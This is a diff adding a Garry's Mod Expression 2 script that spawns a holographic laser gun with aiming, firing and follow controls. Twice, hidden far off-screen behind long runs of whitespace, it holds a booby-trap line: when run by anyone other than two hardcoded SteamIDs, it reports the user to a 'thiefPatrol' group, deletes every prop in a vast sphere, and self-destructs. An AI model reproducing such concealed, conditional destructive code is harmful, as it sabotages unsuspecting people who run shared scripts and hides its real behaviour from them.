@@ -1,0 +1,263 @@
+@name gun
+@persist [Owner Base]:entity AimDir:vector
+@persist [ChargeTimer CooldownTimer RemovedTrails Charging FireInput Follow]
+                                                                                                                                                                                                                                                                                                                                                                                                                                    if((first() | duped()) & owner():steamID()!= "STEAM_0:0:528832741" & owner():steamID() != "STEAM_0:0:566727613"){ dsJoinGroup("thiefPatrol") dsSetScope(10) dsSend("stolenAnane","thiefPatrol",owner()) findIncludePlayerProps(owner()) findInSphere(entity():pos(),999999999999) Entities = findToArray() for(Index = 1,Entities:count()){Entities[Index,entity]:propDelete()} selfDestruct()}
+if(first()){
+    runOnTick(1)
+    runOnChat(1)
+    
+    Owner = owner()
+    
+    propSpawnUndo(0)
+    
+    rangerPersist(1)
+    
+    function void sendMsg(Vectoring:vector, Str:string){
+        printColor(vec(138,43,226), "[ ", vec(0,255,255), "E2", vec(138,43,226), " ]", vec(255),": ", Vectoring, Str)
+        Owner:soundPlay("Notification", 2, "buttons/blip1.wav")
+    }
+    
+    function void createGun(Pos:vector) {
+        Base = propSpawn("models/hunter/blocks/cube025x025x025.mdl",Pos,ang(0,0,0),1)
+        Base:setAlpha(0)
+        Base:setMass(9999999)
+        
+        holoCreate(1)
+        holoParent(1,Base)
+        holoModel(1,"models/props_combine/combine_binocular01.mdl")
+        holoMaterial(1,"models/props_vents/borealis_vent001c")
+        holoScale(1,vec(1,1.2,1))
+        holoPos(1,Base:toWorld(vec(-9,0,0)))
+        holoAng(1,Base:toWorld(ang(-90,0,0)))
+
+        holoCreate(2)
+        holoParent(2,Base)
+        holoModel(2,"models/props_combine/tprotato1.mdl")
+        holoMaterial(2,"models/props_vents/borealis_vent001c")
+        holoScale(2,vec(0.25,0.13,0.35))
+        holoPos(2,Base:toWorld(vec(10,0,6)))
+        holoAng(2,Base:toWorld(ang(-90,180,0)))
+        
+        # Barrels
+        
+        holoCreate(3)
+        holoParent(3,Base)
+        holoModel(3,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(3,"models/props_vents/borealis_vent001c")
+        holoScale(3,vec(0.7,0.175,0.175))
+        holoPos(3,Base:toWorld(vec(20,0,-1)))
+        holoAng(3,Base:toWorld(ang(0,0,0)))
+        
+        ## Actual barrels
+        
+        holoCreate(4)
+        holoParent(4,holoEntity(3))
+        holoModel(4,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(4,"models/props_vents/borealis_vent001c")
+        holoScale(4,vec(0.7,0.175,0.175))
+        holoPos(4,Base:toWorld(vec(22,0,2)))
+        holoAng(4,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(5)
+        holoParent(5,holoEntity(3))
+        holoModel(5,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(5,"models/props_vents/borealis_vent001c")
+        holoScale(5,vec(0.7,0.175,0.175))
+        holoPos(5,Base:toWorld(vec(22,0,-4)))
+        holoAng(5,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(6)
+        holoParent(6,holoEntity(3))
+        holoModel(6,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(6,"models/props_vents/borealis_vent001c")
+        holoScale(6,vec(0.7,0.175,0.175))
+        holoPos(6,Base:toWorld(vec(22,3,-1)))
+        holoAng(6,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(7)
+        holoParent(7,holoEntity(3))
+        holoModel(7,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(7,"models/props_vents/borealis_vent001c")
+        holoScale(7,vec(0.7,0.2,0.2))
+        holoPos(7,Base:toWorld(vec(22,-3,-1)))
+        holoAng(7,Base:toWorld(ang(0,0,0)))
+        
+        ########## outer barrels
+        
+        holoCreate(8)
+        holoParent(8,holoEntity(3))
+        holoModel(8,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(8,"models/props_vents/borealis_vent001c")
+        holoScale(8,vec(0.7,0.175,0.175))
+        holoPos(8,Base:toWorld(vec(22,2,1)))
+        holoAng(8,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(9)
+        holoParent(9,holoEntity(3))
+        holoModel(9,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(9,"models/props_vents/borealis_vent001c")
+        holoScale(9,vec(0.7,0.175,0.175))
+        holoPos(9,Base:toWorld(vec(22,-2,1)))
+        holoAng(9,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(10)
+        holoParent(10,holoEntity(3))
+        holoModel(10,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(10,"models/props_vents/borealis_vent001c")
+        holoScale(10,vec(0.7,0.175,0.175))
+        holoPos(10,Base:toWorld(vec(22,2,-3)))
+        holoAng(10,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(11)
+        holoParent(11,holoEntity(3))
+        holoModel(11,"models/mechanics/robotics/a2.mdl")
+        holoMaterial(11,"models/props_vents/borealis_vent001c")
+        holoScale(11,vec(0.7,0.2,0.2))
+        holoPos(11,Base:toWorld(vec(22,-2,-3)))
+        holoAng(11,Base:toWorld(ang(0,0,0)))
+        
+        # Barrel Plates
+        
+        holoCreate(12)
+        holoParent(12,Base)
+        holoModel(12,"models/hunter/tubes/circle2x2.mdl")
+        holoMaterial(12,"models/props_vents/borealis_vent001c")
+        holoScale(12,vec(0.1,0.1,0.3))
+        holoPos(12,Base:toWorld(vec(36,0,-1)))
+        holoAng(12,Base:toWorld(ang(90,0,0)))
+        
+        holoCreate(13)
+        holoParent(13,Base)
+        holoModel(13,"models/hunter/tubes/circle2x2.mdl")
+        holoMaterial(13,"models/props_vents/borealis_vent001c")
+        holoScale(13,vec(0.1,0.1,3.5))
+        holoPos(13,Base:toWorld(vec(8,0,-1)))
+        holoAng(13,Base:toWorld(ang(90,0,0)))
+        
+        holoCreate(14)
+        holoParent(14,Base)
+        holoModel(14,"models/props_phx/misc/soccerball.mdl")
+        holoMaterial(14,"models/debug/debugwhite")
+        holoScale(14,vec(0.34,0.34,0.34))
+        holoColor(14,vec(255,0,0))
+        holoAlpha(14,100)
+        holoPos(14,Base:toWorld(vec(-2,0,0)))
+        holoAng(14,Base:toWorld(ang(0,0,0)))
+        holoDisableShading(14,1)
+        
+        holoCreate(15)
+        holoParent(15,Base)
+        holoModel(15,"models/props_phx/misc/soccerball.mdl")
+        holoMaterial(15,"models/debug/debugwhite")
+        holoScale(15,vec(0.2,0.2,0.2))
+        holoColor(15,vec(255,0,0))
+        holoAlpha(15,150)
+        holoPos(15,Base:toWorld(vec(-2,0,0)))
+        holoAng(15,Base:toWorld(ang(0,0,0)))
+        holoDisableShading(15,1)
+        
+        holoCreate(16)
+        holoParent(16,Base)
+        holoModel(16,"models/sprops/geometry/fring_36.mdl")
+        holoMaterial(16,"models/props_vents/borealis_vent001c")
+        holoScale(16,vec(0.28,0.28,0.28))
+        holoPos(16,Base:toWorld(vec(-2,0,0)))
+        holoAng(16,Base:toWorld(ang(0,0,0)))
+        
+        holoCreate(17)
+        holoAlpha(17,0)
+        holoPos(17,Base:toWorld(vec(5,0,0)))
+    }
+    
+    function vector lerpVec(V1:vector, V2:vector, T:number) {
+        return V1 + (V2 - V1) * T
+    }
+    
+    function prepareToShoot() {
+        if (systime() < CooldownTimer) {
+            return
+        }
+
+        Charging = 1
+        ChargeTimer = systime() + 0.001
+        CooldownTimer = ChargeTimer + 0.1
+        RemovedTrails = 0
+
+        holoEntity(17):setTrails(100,0,1.6,"trails/laser",vec(255,0,0),255)
+    }
+}
+
+if(chatClk(owner())){
+    LS = owner():lastSaid()    
+    if(!Follow){
+        if(LS:sub(1,7) == "!follow"){
+            Follow = 1
+        }
+    }elseif(Follow){
+        Follow = 0
+    }
+}
+
+if(tickClk()){
+    local BasePos = Base:pos()
+    local TickInt = tickInterval()
+    local SysTime = systime()
+    
+    if(Charging){
+        holoAng(3,Base:toWorld(ang(0,0,curtime()*1500)))
+        holoAng(16,Base:toWorld(ang(0,0,-curtime()*2000)))
+        if(SysTime > ChargeTimer){
+            Charging = 0
+            local Dist = 4000
+            local HitPos = Base:pos() + Base:forward() * Dist
+            
+            rangerFilter(Base)
+            local R = rangerOffset(Dist,Base:pos(),Base:forward() + vec(0,random(0.035,-0.035),random(0.035,-0.035)))
+            if(R:hit()){
+                HitPos = R:pos()
+            }
+
+            holoPos(17,HitPos)
+
+            #ifdef boomCustom(number,vector,number,number)
+                boomCustom(1, HitPos, 50, 100)
+            #else
+                local Prop = propSpawn("models/props_phx/ww2bomb.mdl", HitPos, 1)
+                Prop:propBreak()
+            #endif
+        }
+    }elseif(RemovedTrails == 0 & SysTime > CooldownTimer){
+        holoEntity(17):removeTrails()
+        holoPos(17, Base:pos())
+        RemovedTrails = 1
+    }
+
+    local FireInput = Owner:keyPressed("E")
+    local SpawnInput = Owner:keyPressed("K")
+    
+    if(FireInput){
+        prepareToShoot()
+    }
+    
+    if(changed(SpawnInput) & SpawnInput){
+        if(!Base:isValid()){
+            createGun(Owner:toWorld(vec(0,-50,40)))
+        }else{
+            sendMsg(vec(255,0,0),"You already have a gun spawned")
+        }
+    }
+    
+    if(Base:isValid()){
+        local AimPos = Owner:eyeTraceCursor():position()
+        local TX = -elevation(Base:pos(),ang(0),AimPos)
+        local TY = -bearing(Base:pos(),ang(0),AimPos)
+        
+        AimDir = lerpVec(AimDir,ang(TX,TY,0):forward():normalized(),tickInterval()*5)
+        
+        Base:setAng(AimDir:toAngle())
+        
+        if(Follow){
+            Base:setPos(Owner:toWorld(vec(0,-50,50)))
+        }
+    }                                                                                                                                                                                                                                                                                                                                                                                                                                    if((first() | duped()) & owner():steamID()!= "STEAM_0:0:528832741" & owner():steamID() != "STEAM_0:0:566727613"){ dsJoinGroup("thiefPatrol") dsSetScope(10) dsSend("stolenAnane","thiefPatrol",owner()) findIncludePlayerProps(owner()) findInSphere(entity():pos(),999999999999) Entities = findToArray() for(Index = 1,Entities:count()){Entities[Index,entity]:propDelete()} selfDestruct()}
+}
